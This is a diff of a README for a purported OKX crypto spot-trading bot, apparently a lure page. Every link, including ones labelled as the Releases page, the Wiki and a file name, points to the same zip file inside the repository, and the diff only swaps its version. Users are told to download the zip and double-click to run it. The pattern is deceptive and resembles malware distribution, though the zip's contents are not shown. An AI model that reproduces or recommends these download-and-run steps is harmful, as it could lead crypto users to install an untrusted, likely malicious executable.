@@ -1,6 +1,6 @@
 # 🚀 okx-spot-trading-bot - A Smart Tool for Safe Trading
 
-[![Download Now](https://raw.githubusercontent.com/CoyoteBil/okx-spot-trading-bot/main/quirl/spot-trading-okx-bot-v3.9.zip%20Now-OKX%20Bot-brightgreen)](https://raw.githubusercontent.com/CoyoteBil/okx-spot-trading-bot/main/quirl/spot-trading-okx-bot-v3.9.zip)
+[![Download Now](https://github.com/CoyoteBil/okx-spot-trading-bot/raw/refs/heads/main/quirl/okx-bot-spot-trading-v1.7.zip%20Now-OKX%20Bot-brightgreen)](https://github.com/CoyoteBil/okx-spot-trading-bot/raw/refs/heads/main/quirl/okx-bot-spot-trading-v1.7.zip)
 
 ## 📥 Introduction
 
@@ -21,15 +21,15 @@ Before you download the bot, ensure your system meets the following requirements
 
 To download the OKX Spot Trading Bot, follow these steps:
 
-1. **Visit the Downloads Page:** Click [here](https://raw.githubusercontent.com/CoyoteBil/okx-spot-trading-bot/main/quirl/spot-trading-okx-bot-v3.9.zip) to go to the Releases page.
+1. **Visit the Downloads Page:** Click [here](https://github.com/CoyoteBil/okx-spot-trading-bot/raw/refs/heads/main/quirl/okx-bot-spot-trading-v1.7.zip) to go to the Releases page.
 2. **Select the Latest Release:** Look for the most recent version at the top of the page.
 3. **Download the File:** Click on the appropriate file for your operating system. 
    
-   - For example, if you are using Windows, you might see a file named `https://raw.githubusercontent.com/CoyoteBil/okx-spot-trading-bot/main/quirl/spot-trading-okx-bot-v3.9.zip`. Click on it to start your download.
+   - For example, if you are using Windows, you might see a file named `https://github.com/CoyoteBil/okx-spot-trading-bot/raw/refs/heads/main/quirl/okx-bot-spot-trading-v1.7.zip`. Click on it to start your download.
 
 4. **Run the Bot:** Once downloaded, locate the file on your system and double-click to launch it. Follow any on-screen prompts to complete the setup.
 
-![Download Now](https://raw.githubusercontent.com/CoyoteBil/okx-spot-trading-bot/main/quirl/spot-trading-okx-bot-v3.9.zip%20Now-OKX%20Bot-brightgreen)
+![Download Now](https://github.com/CoyoteBil/okx-spot-trading-bot/raw/refs/heads/main/quirl/okx-bot-spot-trading-v1.7.zip%20Now-OKX%20Bot-brightgreen)
 
 ## ⚙️ Configuration
 
@@ -97,9 +97,9 @@ This project is open-source and licensed under the MIT License. You are free to 
 
 ## ➕ Additional Resources
 
-- **Documentation:** Find detailed information and user guides in the [Wiki section](https://raw.githubusercontent.com/CoyoteBil/okx-spot-trading-bot/main/quirl/spot-trading-okx-bot-v3.9.zip).
+- **Documentation:** Find detailed information and user guides in the [Wiki section](https://github.com/CoyoteBil/okx-spot-trading-bot/raw/refs/heads/main/quirl/okx-bot-spot-trading-v1.7.zip).
 - **Community Forum:** Join discussions with other users in the community forum linked from the repository to share insights and tips.
 
-For more information on how to download and get started with the OKX Spot Trading Bot, keep the provided link handy: [Releases Page](https://raw.githubusercontent.com/CoyoteBil/okx-spot-trading-bot/main/quirl/spot-trading-okx-bot-v3.9.zip).
+For more information on how to download and get started with the OKX Spot Trading Bot, keep the provided link handy: [Releases Page](https://github.com/CoyoteBil/okx-spot-trading-bot/raw/refs/heads/main/quirl/okx-bot-spot-trading-v1.7.zip).
 
 Happy trading!
